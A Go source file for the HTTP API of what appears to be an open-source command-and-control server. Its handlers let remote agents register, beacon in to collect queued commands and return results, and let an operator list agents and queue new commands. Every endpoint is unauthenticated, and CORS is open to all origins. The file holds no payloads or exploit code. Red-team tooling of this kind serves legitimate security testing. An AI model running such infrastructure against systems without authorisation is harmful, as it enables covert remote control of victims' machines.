package api

import (
	"fmt"
	"net/http"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/server/models"

	"github.com/RabbITCybErSeC/BaconC2/server/queue"
	"github.com/RabbITCybErSeC/BaconC2/server/store"
	"github.com/gin-gonic/gin"
)

type Handler struct {
	agentStore   store.AgentStoreInterface
	commandQueue queue.CommandQueue
	engine       *gin.Engine
}

func NewHandler(agentStore store.AgentStoreInterface, commandQueue queue.CommandQueue) *Handler {
	h := &Handler{
		agentStore:   agentStore,
		commandQueue: commandQueue,
		engine:       gin.Default(),
	}

	h.setupRoutes()
	return h
}

func (h *Handler) GinEngine() *gin.Engine {
	return h.engine
}

func (h *Handler) setupRoutes() {
	h.engine.Use(corsMiddleware())

	api := h.engine.Group("/api")
	{
		api.POST("/register", h.handleRegister)
		api.POST("/beacon", h.handleBeacon)
		api.POST("/result", h.handleCommandResult)

		api.GET("/agents", h.handleListAgents)
		api.POST("/command", h.handleAddCommand)
	}
}

func (h *Handler) handleRegister(c *gin.Context) {
	var agent models.Agent
	if err := c.ShouldBindJSON(&agent); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	agent.LastSeen = time.Now()
	agent.IsActive = true
	agent.Commands = []models.Command{}
	agent.Protocol = "http"

	if err := h.agentStore.Register(&agent); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusCreated, gin.H{"status": "registered"})
}

func (h *Handler) handleBeacon(c *gin.Context) {
	agentID := c.Query("id")
	if agentID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent ID required"})
		return
	}

	_, err := h.agentStore.Get(agentID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
		return
	}

	if err := h.agentStore.UpdateLastSeen(agentID); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	cmd, hasCommand := h.commandQueue.Get(agentID)

	if hasCommand {
		if err := h.agentStore.UpdateAgentCommands(agentID, cmd); err != nil {
			fmt.Printf("Error updating agent commands: %v", err)
		}
		c.JSON(http.StatusOK, cmd)
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": "acknowledged"})
}

func (h *Handler) handleCommandResult(c *gin.Context) {
	agentID := c.Query("id")
	if agentID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent ID required"})
		return
	}

	var result models.Command
	if err := c.ShouldBindJSON(&result); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	_, err := h.agentStore.Get(agentID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
		return
	}

	// Update command result in agent's history
	if err := h.agentStore.UpdateAgentCommands(agentID, result); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": "received"})
}

func (h *Handler) handleListAgents(c *gin.Context) {
	agentList, err := h.agentStore.List()
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	jsonAgents := make([]models.Agent, 0, len(agentList))
	for _, agent := range agentList {
		jsonAgents = append(jsonAgents, *agent)
	}

	c.JSON(http.StatusOK, jsonAgents)
}

func (h *Handler) handleAddCommand(c *gin.Context) {
	var cmd models.Command
	if err := c.ShouldBindJSON(&cmd); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	agentID := c.Query("id")
	if agentID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Agent ID required"})
		return
	}

	_, err := h.agentStore.Get(agentID)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
		return
	}

	cmd.Status = "pending"
	cmd.ID = fmt.Sprintf("%d", time.Now().UnixNano())

	if err := h.commandQueue.Add(agentID, cmd); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": "queued", "id": cmd.ID})
}

func corsMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
		c.Writer.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		c.Writer.Header().Set("Access-Control-Allow-Headers", "Content-Type")

		if c.Request.Method == http.MethodOptions {
			c.AbortWithStatus(http.StatusOK)
			return
		}

		c.Next()
	}
}
